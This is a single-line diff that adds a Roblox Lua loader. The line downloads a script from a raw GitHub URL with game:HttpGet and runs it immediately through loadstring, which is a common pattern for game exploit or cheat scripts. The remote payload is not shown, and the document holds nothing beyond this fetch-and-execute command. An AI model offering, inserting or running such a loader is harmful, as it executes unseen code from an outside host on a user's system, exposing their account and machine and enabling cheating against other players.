@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmOnTablet/Je/main/I SEE YOU"))()
